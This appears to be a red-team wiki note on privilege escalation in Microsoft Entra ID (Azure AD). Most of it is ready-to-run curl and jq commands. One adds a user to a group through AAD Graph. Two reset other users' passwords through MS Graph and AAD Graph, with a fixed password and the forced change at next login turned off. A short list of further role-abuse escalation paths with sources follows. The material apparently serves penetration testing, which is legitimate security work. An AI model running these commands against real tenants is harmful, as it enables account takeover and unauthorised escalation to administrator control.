---
title: Entra Escalation
---

[[notes/mitre-attack/privilege-escalation]] in [[notes/entra/index]].

Add the user with id `f66e133c-bd01-4b0b-b3b7-7cd949fd45f3` to the group `e6870783-1378-4078-b242-84c08c6dc0d7` trough AAD Graph.

~~~ bash
jq -n --arg tenant $tenant_id '{"url":"https://graph.windows.net/\($tenant)/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3"}' | curl -sSf -H 'Content-Type: application/json' -H "Authorization: Bearer $msgraph_token" "https://graph.windows.net/$tenant_id/groups/e6870783-1378-4078-b242-84c08c6dc0d7/$links/members?api-version=1.6" -d @-
~~~

Reset the password of another user trough MS Graph.

~~~ bash
curl -sSf -H "Authorization: Bearer $msgraph_token" "https://graph.microsoft.com/v1.0/users/$upn/authentication/methods/28c10230-6103-485e-b985-444c60001490/resetPassword" -d '{"newPassword":"P@ssw0rd1234"}' | jq
~~~

Reset the password of another user trough AAD Graph.

~~~ bash
curl -sSf -H "Authorization: Bearer $aadgraph_token" "https://graph.windows.net/$tenant_id/users/$user_id?api-version=1.6" -d '{"passwordProfile":{"password":"P@ssw0rd1234","forceChangePasswordNextLogin":false,"enforceChangePasswordPolicy":false}}' -X PATCH -H 'Content-Type: application/json'
~~~

More paths:

- *Application Administrator* can take over all service principals ([source](http://web.archive.org/web/20230523081045/https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/))
- *Privileged Role Administrator* can become *Global Administrator* ([source](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#azure-ad-roles))
- *Global Administrator* can take over all subscriptions in the tenant by granting himself the *User Access Administrator* role in ARM ([source](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#elevate-azure-subscription-access), [source](http://web.archive.org/web/20230123080516/https://sofblocks.github.io/azure-attack-paths/#adding-global-admin-to-azure-subscriptions), [source](https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin))
